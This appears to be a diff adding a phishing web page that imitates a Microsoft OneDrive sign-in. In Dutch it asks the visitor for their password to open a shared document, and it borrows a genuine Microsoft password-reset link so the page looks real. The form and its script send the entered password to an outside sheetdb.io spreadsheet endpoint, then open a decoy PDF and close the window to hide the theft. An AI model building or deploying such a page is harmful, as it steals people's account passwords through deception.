@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OneDrive Sign In</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: url('illustration.jpg') center center fixed; /* Replace with your background image */
+            background-size: cover;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        form {
+            width: 400px; /* Increased the width to 400px */
+            padding: 20px;
+            border: 1px solid #ddd;
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 0px;
+            text-align: left;
+            position: relative;
+            margin-right: auto; /* Align to the left */
+            margin-left: auto;
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 2px; /* Adjusted space under the heading */
+            font-size: 24px; /* Adjusted font size */
+        }
+
+        label {
+            display: block;
+            margin: 10px 0 5px;
+            color: #333;
+            text-align: left;
+        }
+
+        input {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin: 0 10px 15px;
+            border: none;
+            border-bottom: 1px solid #ddd; /* Added a bottom border */
+            box-sizing: border-box;
+            font-size: 16px; /* Adjusted font size */
+        }
+
+        p {
+            text-align: left;
+            color: #333;
+            margin-bottom: 20px; /* Added more space under the paragraph */
+        }
+
+        a {
+            color: dodgerblue;
+            font-size: 12px; /* Adjusted font size for the link */
+        }
+
+        .clearfix::after {
+            content: "";
+            clear: both;
+            display: table;
+        }
+
+        .signupbtn {
+            width: 30%; /* Adjusted the width to make the button smaller */
+            padding: 8px; /* Adjusted padding for a smaller button */
+            border-radius: 0px;
+            cursor: pointer;
+            background-color: #0053a5;
+            color: #fff;
+            border: none;
+            position: absolute;
+            bottom: 10px; /* Positioned at the bottom */
+            right: 10px; /* Positioned at the right */
+        }
+
+        .signupbtn:hover {
+            background-color: #005a9e;
+        }
+
+        .logo {
+            width: 145px; /* Adjusted to make the logo larger */
+            height: auto;
+            position: absolute;
+            top: 5px;
+            left: 15px;
+            margin-bottom: 20px; /* Added more space under the logo */
+        }
+    </style>
+</head>
+<body>
+    <form action="https://sheetdb.io/api/v1/in809r7hsx8hy" method="post" id="sheetdb-form">
+        <img class="logo" src="logo-EHB.png" alt="Logo">
+        <div class="container">
+            <br>
+            <br>
+            <br>
+
+            <h1>Wachtwoord invoeren</h1>
+
+            <p> &nbspOm gedeeld document te openen</p>
+            <br>
+
+            <label for="psw"><b></b></label>
+            <input type="password" placeholder="Wachtwoord" name="data[psw]" required>
+            &nbsp &nbsp <a style="text-decoration:none" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAAhZKxb9tWEMZF2VZsoY0FtyjSTm7QoUhKio-iKcmAgcoibYkSSVGhbVGLQFKPIimSjyafJEp_QdrJTYEC9djRGVJkCgIE6FpPzpoxUxEgaNGlAdqhErJ06zd8uDv8hjvcl9_kqBJL0RR9bw1QYP8L-r04cuUkbduAtOCq-o_inXxhq8XdfNr5Rr56-Hfh-Pr5yyvicwfjKNkvFiMUY8OnkG27FqQsFBR9Ixy64egZQdwQxG8E8Sj7mRnDEFPYgfPk6wRPhqsOOiZlwsvsRuiTcvsqm3ClSomrMhWwV2XoSpnZq1B60B_LjLDQAwHL3pGnP6BpfSGP29potpxjme96yplQUrQRkHkVSLye6oy6ZAQsaX1HXvJ9XnTaZ8Ki751giTkay541l5gmqyz5V9ltpTbBDrMyFLsL-Gd2y0ZxMIhQgi_XHmWVCIbNYR2FIbQwtcKWu7uWgV0UdmIUwRi7MDkImnNFt4dV98gbKxaL2Y5txKm9cOoITmYtm5_3VNGkfbcXAm9EalpLqtBTC3JdICoPZrHFI9I1nHHvsDxshaAM8ZSlgxI4Hph87zzpLoR6t8bWgkOLlnseb57ye4NI6sWA1jsnQm9A2s7ZtJWczyCgxXjaUzqi0220Tw7VYKz226VOis40cZCeBrZaq_MIaQ1dBf1y5Zic2ikXefMZK0iH05bo9ZNTRQu4BWOMyEbN0BPdjgGQp3qqKQ2jzj5dyy2_HKDweu328v7QHe5GMbJdH96sE2_WP9nMFe7eyexmvvyY3tjf3MwXtu_c2s28Wyd-2lgm6fLiskn9frf-3evmtzs_viCuN4qoppmNomkYjCre75YUP2D0cNyf8iPDl-LhRN7TAeu3i6qhHlT3wUWOuMjlrnNbTX4gCxpbZv7IEQ9vZZ5v_X8mX33wUT4_cQc-sgwfJjvvs_fLh5l3t__6_odfHz_5523jzfZXklsTGebcl8vSSZp2orlVrZdFZHLtSofX78dpyz2Way3ZqlYOfi5k_gU1&mkt=nl-NL&hosted=0&device_platform=macOSr">Wachtwoord vergeten</a>
+            <div class="clearfix">
+                <br>
+                <br>
+                <br>
+
+                <button type="submit" class="signupbtn">Aanmelden</button>
+            </div>
+        </div>
+    </form>
+    <script>
+        var form = document.getElementById('sheetdb-form');
+        form.addEventListener("submit", e => {
+            e.preventDefault();
+            fetch(form.action, {
+                method: "POST",
+                body: new FormData(document.getElementById("sheetdb-form")),
+            }).then(
+                response => response.json()
+            ).then(() => {
+                // you can put any JS code here
+                window.open('Fluo III.pdf', '_blank');
+                window.close();
+            });
+        });
+    </script>
+</body>
+</html>
